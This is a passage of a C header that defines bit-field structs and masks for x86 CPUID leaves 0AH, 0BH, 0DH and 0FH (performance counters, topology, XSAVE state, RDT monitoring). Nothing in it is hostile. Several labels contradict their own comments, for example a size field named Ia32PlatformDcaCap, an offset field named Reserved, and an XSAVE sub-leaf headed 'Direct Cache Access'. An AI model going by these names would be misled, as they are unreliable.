#define CPUID_EBX_CORE_CYCLE_EVENT_NOT_AVAILABLE(_)                  (((_) >> 0) & 0x01)

            /**
             * [Bit 1] Instruction retired event not available if 1.
             */
            UINT32 InstructionRetiredEventNotAvailable : 1;
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_BIT        1
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_FLAG       0x02
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_MASK       0x01
#define CPUID_EBX_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE(_)         (((_) >> 1) & 0x01)

            /**
             * [Bit 2] Reference cycles event not available if 1.
             */
            UINT32 ReferenceCyclesEventNotAvailable : 1;
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE_BIT           2
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE_FLAG          0x04
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE_MASK          0x01
#define CPUID_EBX_REFERENCE_CYCLES_EVENT_NOT_AVAILABLE(_)            (((_) >> 2) & 0x01)

            /**
             * [Bit 3] Last-level cache reference event not available if 1.
             */
            UINT32 LastLevelCacheReferenceEventNotAvailable : 1;
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE_BIT 3
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE_FLAG 0x08
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_LAST_LEVEL_CACHE_REFERENCE_EVENT_NOT_AVAILABLE(_)  (((_) >> 3) & 0x01)

            /**
             * [Bit 4] Last-level cache misses event not available if 1.
             */
            UINT32 LastLevelCacheMissesEventNotAvailable : 1;
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE_BIT    4
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE_FLAG   0x10
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE_MASK   0x01
#define CPUID_EBX_LAST_LEVEL_CACHE_MISSES_EVENT_NOT_AVAILABLE(_)     (((_) >> 4) & 0x01)

            /**
             * [Bit 5] Branch instruction retired event not available if 1.
             */
            UINT32 BranchInstructionRetiredEventNotAvailable : 1;
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_BIT 5
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_FLAG 0x20
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_BRANCH_INSTRUCTION_RETIRED_EVENT_NOT_AVAILABLE(_)  (((_) >> 5) & 0x01)

            /**
             * [Bit 6] Branch mispredict retired event not available if 1.
             */
            UINT32 BranchMispredictRetiredEventNotAvailable : 1;
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE_BIT  6
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE_FLAG 0x40
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE_MASK 0x01
#define CPUID_EBX_BRANCH_MISPREDICT_RETIRED_EVENT_NOT_AVAILABLE(_)   (((_) >> 6) & 0x01)
            UINT32 Reserved1 : 25;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 4:0] Number of fixed-function performance counters (if Version ID > 1).
             */
            UINT32 NumberOfFixedFunctionPerformanceCounters : 5;
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_BIT  0
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_FLAG 0x1F
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_MASK 0x1F
#define CPUID_EDX_NUMBER_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS(_)   (((_) >> 0) & 0x1F)

            /**
             * [Bits 12:5] Bit width of fixed-function performance counters (if Version ID > 1).
             */
            UINT32 BitWidthOfFixedFunctionPerformanceCounters : 8;
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_BIT 5
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_FLAG 0x1FE0
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS_MASK 0xFF
#define CPUID_EDX_BIT_WIDTH_OF_FIXED_FUNCTION_PERFORMANCE_COUNTERS(_) (((_) >> 5) & 0xFF)
            UINT32 Reserved1 : 2;

            /**
             * [Bit 15] AnyThread deprecation.
             */
            UINT32 AnyThreadDeprecation : 1;
#define CPUID_EDX_ANY_THREAD_DEPRECATION_BIT                         15
#define CPUID_EDX_ANY_THREAD_DEPRECATION_FLAG                        0x8000
#define CPUID_EDX_ANY_THREAD_DEPRECATION_MASK                        0x01
#define CPUID_EDX_ANY_THREAD_DEPRECATION(_)                          (((_) >> 15) & 0x01)
            UINT32 Reserved2 : 16;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0A;


/**
 * @brief Extended Topology Enumeration Leaf
 *
 * When CPUID executes with EAX set to 0BH, the processor returns information about extended topology enumeration data.
 * Software must detect the presence of CPUID leaf 0BH by verifying
 * - the highest leaf index supported by CPUID is >= 0BH, and
 * - CPUID.0BH:EBX[15:0] reports a non-zero value.
 *
 * @note Most of Leaf 0BH output depends on the initial value in ECX. The EDX output of leaf 0BH is always valid and does
 *       not vary with input value in ECX. Output value in ECX[7:0] always equals input value in ECX[7:0]. Sub-leaf index 0
 *       enumerates SMT level. Each subsequent higher sub-leaf index enumerates a higherlevel topological entity in hierarchical
 *       order. For sub-leaves that return an invalid level-type of 0 in ECX[15:8]; EAX and EBX will return 0. If an input value
 *       n in ECX returns the invalid level-type of 0 in ECX[15:8], other input values with ECX > n also return 0 in ECX[15:8].
 */
#define CPUID_EXTENDED_TOPOLOGY                                      0x0000000B
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 4:0] Number of bits to shift right on x2APIC ID to get a unique topology ID of the next level type. All logical
             * processors with the same next level ID share current level.
             *
             * @note Software should use this field (EAX[4:0]) to enumerate processor topology of the system.
             */
            UINT32 X2ApicIdToUniqueTopologyIdShift : 5;
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT_BIT          0
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT_FLAG         0x1F
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT_MASK         0x1F
#define CPUID_EAX_X2APIC_ID_TO_UNIQUE_TOPOLOGY_ID_SHIFT(_)           (((_) >> 0) & 0x1F)
            UINT32 Reserved1 : 27;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 15:0] Number of logical processors at this level type. The number reflects configuration as shipped by Intel.
             *
             * @note Software must not use EBX[15:0] to enumerate processor topology of the system. This value in this field
             *       (EBX[15:0]) is only intended for display/diagnostic purposes. The actual number of logical processors available to
             *       BIOS/OS/Applications may be different from the value of EBX[15:0], depending on software and platform hardware
             *       configurations.
             */
            UINT32 NumberOfLogicalProcessorsAtThisLevelType : 16;
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE_BIT 0
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE_FLAG 0xFFFF
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE_MASK 0xFFFF
#define CPUID_EBX_NUMBER_OF_LOGICAL_PROCESSORS_AT_THIS_LEVEL_TYPE(_) (((_) >> 0) & 0xFFFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 7:0] Level number. Same value in ECX input.
             */
            UINT32 LevelNumber : 8;
#define CPUID_ECX_LEVEL_NUMBER_BIT                                   0
#define CPUID_ECX_LEVEL_NUMBER_FLAG                                  0xFF
#define CPUID_ECX_LEVEL_NUMBER_MASK                                  0xFF
#define CPUID_ECX_LEVEL_NUMBER(_)                                    (((_) >> 0) & 0xFF)

            /**
             * [Bits 15:8] Level type.
             *
             * @note The value of the "level type" field is not related to level numbers in any way, higher "level type" values do not
             *       mean higher levels. Level type field has the following encoding:
             *       - 0: Invalid.
             *       - 1: SMT.
             *       - 2: Core.
             *       - 3-255: Reserved.
             */
            UINT32 LevelType : 8;
#define CPUID_ECX_LEVEL_TYPE_BIT                                     8
#define CPUID_ECX_LEVEL_TYPE_FLAG                                    0xFF00
#define CPUID_ECX_LEVEL_TYPE_MASK                                    0xFF
#define CPUID_ECX_LEVEL_TYPE(_)                                      (((_) >> 8) & 0xFF)
            UINT32 Reserved1 : 16;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] x2APIC ID the current logical processor.
             */
            UINT32 X2ApicId : 32;
#define CPUID_EDX_X2APIC_ID_BIT                                      0
#define CPUID_EDX_X2APIC_ID_FLAG                                     0xFFFFFFFF
#define CPUID_EDX_X2APIC_ID_MASK                                     0xFFFFFFFF
#define CPUID_EDX_X2APIC_ID(_)                                       (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0B;

/**
 * @defgroup CPUID_EAX_0D \
 *           EAX = 0x0D
 *
 * When CPUID executes with EAX set to 0DH and ECX = 0, the processor returns information about the bit-vector
 * representation of all processor state extensions that are supported in the processor and storage size requirements of
 * the XSAVE/XRSTOR area.
 * When CPUID executes with EAX set to 0DH and ECX = n (n > 1, and is a valid sub-leaf index), the processor returns
 * information about the size and offset of each processor extended state save area within the XSAVE/XRSTOR area. Software
 * can use the forward-extendable technique depicted below to query the valid sub-leaves and obtain size and offset
 * information for each processor extended state save area:
 * <pre> For i = 2 to 62 // sub-leaf 1 is reserved IF (CPUID.(EAX=0DH, ECX=0):VECTOR[i] = 1) // VECTOR is the 64-bit value
 * of EDX:EAX Execute CPUID.(EAX=0DH, ECX = i) to examine size and offset for sub-leaf i; FI; </pre>
 * @{
 */
#define CPUID_EXTENDED_STATE_INFORMATION                             0x0000000D
 /**
  * @brief Processor Extended State Enumeration Main Leaf (EAX = 0DH, ECX = 0)
  */
typedef struct
{
    /**
     * @brief Reports the supported bits of the lower 32 bits of XCR0. XCR0[n] can be set to 1 only if EAX[n] is 1
     */
    union
    {
        struct
        {
            /**
             * [Bit 0] x87 state.
             */
            UINT32 X87State : 1;
#define CPUID_EAX_X87_STATE_BIT                                      0
#define CPUID_EAX_X87_STATE_FLAG                                     0x01
#define CPUID_EAX_X87_STATE_MASK                                     0x01
#define CPUID_EAX_X87_STATE(_)                                       (((_) >> 0) & 0x01)

            /**
             * [Bit 1] SSE state.
             */
            UINT32 SseState : 1;
#define CPUID_EAX_SSE_STATE_BIT                                      1
#define CPUID_EAX_SSE_STATE_FLAG                                     0x02
#define CPUID_EAX_SSE_STATE_MASK                                     0x01
#define CPUID_EAX_SSE_STATE(_)                                       (((_) >> 1) & 0x01)

            /**
             * [Bit 2] AVX state.
             */
            UINT32 AvxState : 1;
#define CPUID_EAX_AVX_STATE_BIT                                      2
#define CPUID_EAX_AVX_STATE_FLAG                                     0x04
#define CPUID_EAX_AVX_STATE_MASK                                     0x01
#define CPUID_EAX_AVX_STATE(_)                                       (((_) >> 2) & 0x01)

            /**
             * [Bits 4:3] MPX state.
             */
            UINT32 MpxState : 2;
#define CPUID_EAX_MPX_STATE_BIT                                      3
#define CPUID_EAX_MPX_STATE_FLAG                                     0x18
#define CPUID_EAX_MPX_STATE_MASK                                     0x03
#define CPUID_EAX_MPX_STATE(_)                                       (((_) >> 3) & 0x03)

            /**
             * [Bits 7:5] AVX-512 state.
             */
            UINT32 Avx512State : 3;
#define CPUID_EAX_AVX_512_STATE_BIT                                  5
#define CPUID_EAX_AVX_512_STATE_FLAG                                 0xE0
#define CPUID_EAX_AVX_512_STATE_MASK                                 0x07
#define CPUID_EAX_AVX_512_STATE(_)                                   (((_) >> 5) & 0x07)

            /**
             * [Bit 8] Used for IA32_XSS.
             */
            UINT32 UsedForIa32Xss1 : 1;
#define CPUID_EAX_USED_FOR_IA32_XSS_1_BIT                            8
#define CPUID_EAX_USED_FOR_IA32_XSS_1_FLAG                           0x100
#define CPUID_EAX_USED_FOR_IA32_XSS_1_MASK                           0x01
#define CPUID_EAX_USED_FOR_IA32_XSS_1(_)                             (((_) >> 8) & 0x01)

            /**
             * [Bit 9] PKRU state.
             */
            UINT32 PkruState : 1;
#define CPUID_EAX_PKRU_STATE_BIT                                     9
#define CPUID_EAX_PKRU_STATE_FLAG                                    0x200
#define CPUID_EAX_PKRU_STATE_MASK                                    0x01
#define CPUID_EAX_PKRU_STATE(_)                                      (((_) >> 9) & 0x01)
            UINT32 Reserved1 : 3;

            /**
             * [Bit 13] Used for IA32_XSS.
             */
            UINT32 UsedForIa32Xss2 : 1;
#define CPUID_EAX_USED_FOR_IA32_XSS_2_BIT                            13
#define CPUID_EAX_USED_FOR_IA32_XSS_2_FLAG                           0x2000
#define CPUID_EAX_USED_FOR_IA32_XSS_2_MASK                           0x01
#define CPUID_EAX_USED_FOR_IA32_XSS_2(_)                             (((_) >> 13) & 0x01)
            UINT32 Reserved2 : 18;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Maximum size (bytes, from the beginning of the XSAVE/XRSTOR save area) required by enabled features in XCR0.
             * May be different than ECX if some features at the end of the XSAVE save area are not enabled.
             */
            UINT32 MaxSizeRequiredByEnabledFeaturesInXcr0 : 32;
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0_BIT  0
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0_FLAG 0xFFFFFFFF
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0_MASK 0xFFFFFFFF
#define CPUID_EBX_MAX_SIZE_REQUIRED_BY_ENABLED_FEATURES_IN_XCR0(_)   (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Maximum size (bytes, from the beginning of the XSAVE/XRSTOR save area) of the XSAVE/XRSTOR save area
             * required by all supported features in the processor, i.e., all the valid bit fields in XCR0.
             */
            UINT32 MaxSizeOfXsaveXrstorSaveArea : 32;
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA_BIT             0
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA_FLAG            0xFFFFFFFF
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA_MASK            0xFFFFFFFF
#define CPUID_ECX_MAX_SIZE_OF_XSAVE_XRSTOR_SAVE_AREA(_)              (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Reports the supported bits of the upper 32 bits of XCR0. XCR0[n+32] can be set to 1 only if EDX[n] is 1.
             */
            UINT32 Xcr0SupportedBits : 32;
#define CPUID_EDX_XCR0_SUPPORTED_BITS_BIT                            0
#define CPUID_EDX_XCR0_SUPPORTED_BITS_FLAG                           0xFFFFFFFF
#define CPUID_EDX_XCR0_SUPPORTED_BITS_MASK                           0xFFFFFFFF
#define CPUID_EDX_XCR0_SUPPORTED_BITS(_)                             (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0D_ECX_00;

/**
 * @brief Direct Cache Access Information Leaf
 */
typedef struct
{
    union
    {
        struct
        {
            UINT32 Reserved1 : 1;

            /**
             * [Bit 1] Supports XSAVEC and the compacted form of XRSTOR if set.
             */
            UINT32 SupportsXsavecAndCompactedXrstor : 1;
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR_BIT           1
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR_FLAG          0x02
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR_MASK          0x01
#define CPUID_EAX_SUPPORTS_XSAVEC_AND_COMPACTED_XRSTOR(_)            (((_) >> 1) & 0x01)

            /**
             * [Bit 2] Supports XGETBV with ECX = 1 if set.
             */
            UINT32 SupportsXgetbvWithEcx1 : 1;
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1_BIT                     2
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1_FLAG                    0x04
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1_MASK                    0x01
#define CPUID_EAX_SUPPORTS_XGETBV_WITH_ECX_1(_)                      (((_) >> 2) & 0x01)

            /**
             * [Bit 3] Supports XSAVES/XRSTORS and IA32_XSS if set.
             */
            UINT32 SupportsXsaveXrstorAndIa32Xss : 1;
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS_BIT             3
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS_FLAG            0x08
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS_MASK            0x01
#define CPUID_EAX_SUPPORTS_XSAVE_XRSTOR_AND_IA32_XSS(_)              (((_) >> 3) & 0x01)
            UINT32 Reserved2 : 28;
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] The size in bytes of the XSAVE area containing all states enabled by XCRO | IA32_XSS.
             */
            UINT32 SizeOfXsaveAread : 32;
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD_BIT                            0
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD_FLAG                           0xFFFFFFFF
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD_MASK                           0xFFFFFFFF
#define CPUID_EBX_SIZE_OF_XSAVE_AREAD(_)                             (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 7:0] Used for XCR0.
             */
            UINT32 UsedForXcr01 : 8;
#define CPUID_ECX_USED_FOR_XCR0_1_BIT                                0
#define CPUID_ECX_USED_FOR_XCR0_1_FLAG                               0xFF
#define CPUID_ECX_USED_FOR_XCR0_1_MASK                               0xFF
#define CPUID_ECX_USED_FOR_XCR0_1(_)                                 (((_) >> 0) & 0xFF)

            /**
             * [Bit 8] PT state.
             */
            UINT32 PtState : 1;
#define CPUID_ECX_PT_STATE_BIT                                       8
#define CPUID_ECX_PT_STATE_FLAG                                      0x100
#define CPUID_ECX_PT_STATE_MASK                                      0x01
#define CPUID_ECX_PT_STATE(_)                                        (((_) >> 8) & 0x01)

            /**
             * [Bit 9] Used for XCR0.
             */
            UINT32 UsedForXcr02 : 1;
#define CPUID_ECX_USED_FOR_XCR0_2_BIT                                9
#define CPUID_ECX_USED_FOR_XCR0_2_FLAG                               0x200
#define CPUID_ECX_USED_FOR_XCR0_2_MASK                               0x01
#define CPUID_ECX_USED_FOR_XCR0_2(_)                                 (((_) >> 9) & 0x01)
            UINT32 Reserved1 : 3;

            /**
             * [Bit 13] HWP state.
             */
            UINT32 HwpState : 1;
#define CPUID_ECX_HWP_STATE_BIT                                      13
#define CPUID_ECX_HWP_STATE_FLAG                                     0x2000
#define CPUID_ECX_HWP_STATE_MASK                                     0x01
#define CPUID_ECX_HWP_STATE(_)                                       (((_) >> 13) & 0x01)
            UINT32 Reserved2 : 18;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] EDX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0D_ECX_01;

/**
 * @brief Processor Extended State Enumeration Sub-leaves (EAX = 0DH, ECX = n, n > 1)
 *
 * @note Leaf 0DH output depends on the initial value in ECX. Each sub-leaf index (starting at position 2) is supported if
 *       it corresponds to a supported bit in either the XCR0 register or the IA32_XSS MSR.
 *       If ECX contains an invalid sub-leaf index, EAX/EBX/ECX/EDX return 0. Sub-leaf n (0 <= n <= 31) is invalid if sub-leaf 0
 *       returns 0 in EAX[n] and sub-leaf 1 returns 0 in ECX[n]. Sub-leaf n (32 <= n <= 63) is invalid if sub-leaf 0 returns 0 in
 *       EDX[n-32] and sub-leaf 1 returns 0 in EDX[n-32].
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] The size in bytes (from the offset specified in EBX) of the save area for an extended state feature
             * associated with a valid sub-leaf index, n.
             */
            UINT32 Ia32PlatformDcaCap : 32;
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_BIT                          0
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_FLAG                         0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP_MASK                         0xFFFFFFFF
#define CPUID_EAX_IA32_PLATFORM_DCA_CAP(_)                           (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] The offset in bytes of this extended state component's save area from the beginning of the XSAVE/XRSTOR
             * area.
             * This field reports 0 if the sub-leaf index, n, does not map to a valid bit in the XCR0 register.
             */
            UINT32 Reserved : 32;
#define CPUID_EBX_RESERVED_BIT                                       0
#define CPUID_EBX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EBX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bit 0] Is set if the bit n (corresponding to the sub-leaf index) is supported in the IA32_XSS MSR; it is clear if bit n
             * is instead supported in XCR0.
             */
            UINT32 Ecx2 : 1;
#define CPUID_ECX_ECX_2_BIT                                          0
#define CPUID_ECX_ECX_2_FLAG                                         0x01
#define CPUID_ECX_ECX_2_MASK                                         0x01
#define CPUID_ECX_ECX_2(_)                                           (((_) >> 0) & 0x01)

            /**
             * [Bit 1] Is set if, when the compacted format of an XSAVE area is used, this extended state component located on the next
             * 64-byte boundary following the preceding state component (otherwise, it is located immediately following the preceding
             * state component).
             */
            UINT32 Ecx1 : 1;
#define CPUID_ECX_ECX_1_BIT                                          1
#define CPUID_ECX_ECX_1_FLAG                                         0x02
#define CPUID_ECX_ECX_1_MASK                                         0x01
#define CPUID_ECX_ECX_1(_)                                           (((_) >> 1) & 0x01)
            UINT32 Reserved1 : 30;
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] This field reports 0 if the sub-leaf index, n, is invalid; otherwise it is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EDX_RESERVED_BIT                                       0
#define CPUID_EDX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EDX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0D_ECX_N;

/**
 * @}
 */

 /**
  * @defgroup CPUID_EAX_0F \
  *           EAX = 0x0F
  *
  * When CPUID executes with EAX set to 0FH and ECX = 0, the processor returns information about the bit-vector
  * representation of QoS monitoring resource types that are supported in the processor and maximum range of RMID values the
  * processor can use to monitor of any supported resource types. Each bit, starting from bit 1, corresponds to a specific
  * resource type if the bit is set. The bit position corresponds to the sub-leaf index (or ResID) that software must use to
  * query QoS monitoring capability available for that type. See Table 3-8.
  * When CPUID executes with EAX set to 0FH and ECX = n (n >= 1, and is a valid ResID), the processor returns information
  * software can use to program IA32_PQR_ASSOC, IA32_QM_EVTSEL MSRs before reading QoS data from the IA32_QM_CTR MSR.
  * @{
  */
#define CPUID_INTEL_RESOURCE_DIRECTOR_TECHNOLOGY_MONITORING_INFORMATION 0x0000000F
  /**
   * @brief Intel Resource Director Technology (Intel RDT) Monitoring Enumeration Sub-leaf (EAX = 0FH, ECX = 0)
   *
   * @note Leaf 0FH output depends on the initial value in ECX. Sub-leaf index 0 reports valid resource type starting at bit
   *       position 1 of EDX.
   */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Maximum range (zero-based) of RMID within this physical processor of all types.
             */
            UINT32 RmidMaxRange : 32;
#define CPUID_EBX_RMID_MAX_RANGE_BIT                                 0
#define CPUID_EBX_RMID_MAX_RANGE_FLAG                                0xFFFFFFFF
#define CPUID_EBX_RMID_MAX_RANGE_MASK                                0xFFFFFFFF
#define CPUID_EBX_RMID_MAX_RANGE(_)                                  (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] ECX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_ECX_RESERVED_BIT                                       0
#define CPUID_ECX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_ECX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            UINT32 Reserved1 : 1;

            /**
             * [Bit 1] Supports L3 Cache Intel RDT Monitoring if 1.
             */
            UINT32 SupportsL3CacheIntelRdtMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING_BIT         1
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING_FLAG        0x02
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING_MASK        0x01
#define CPUID_EDX_SUPPORTS_L3_CACHE_INTEL_RDT_MONITORING(_)          (((_) >> 1) & 0x01)
            UINT32 Reserved2 : 30;
        };

        UINT32 Flags;
    } Edx;

} CPUID_EAX_0F_ECX_00;

/**
 * @brief L3 Cache Intel RDT Monitoring Capability Enumeration Sub-leaf (EAX = 0FH, ECX = 1)
 *
 * @note Leaf 0FH output depends on the initial value in ECX.
 */
typedef struct
{
    union
    {
        struct
        {
            /**
             * [Bits 31:0] EAX is reserved.
             */
            UINT32 Reserved : 32;
#define CPUID_EAX_RESERVED_BIT                                       0
#define CPUID_EAX_RESERVED_FLAG                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED_MASK                                      0xFFFFFFFF
#define CPUID_EAX_RESERVED(_)                                        (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Eax;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Conversion factor from reported IA32_QM_CTR value to occupancy metric (bytes).
             */
            UINT32 ConversionFactor : 32;
#define CPUID_EBX_CONVERSION_FACTOR_BIT                              0
#define CPUID_EBX_CONVERSION_FACTOR_FLAG                             0xFFFFFFFF
#define CPUID_EBX_CONVERSION_FACTOR_MASK                             0xFFFFFFFF
#define CPUID_EBX_CONVERSION_FACTOR(_)                               (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ebx;

    union
    {
        struct
        {
            /**
             * [Bits 31:0] Maximum range (zero-based) of RMID within this physical processor of all types.
             */
            UINT32 RmidMaxRange : 32;
#define CPUID_ECX_RMID_MAX_RANGE_BIT                                 0
#define CPUID_ECX_RMID_MAX_RANGE_FLAG                                0xFFFFFFFF
#define CPUID_ECX_RMID_MAX_RANGE_MASK                                0xFFFFFFFF
#define CPUID_ECX_RMID_MAX_RANGE(_)                                  (((_) >> 0) & 0xFFFFFFFF)
        };

        UINT32 Flags;
    } Ecx;

    union
    {
        struct
        {
            /**
             * [Bit 0] Supports L3 occupancy monitoring if 1.
             */
            UINT32 SupportsL3OccupancyMonitoring : 1;
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING_BIT               0
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING_FLAG              0x01
#define CPUID_EDX_SUPPORTS_L3_OCCUPANCY_MONITORING_MASK              0x01
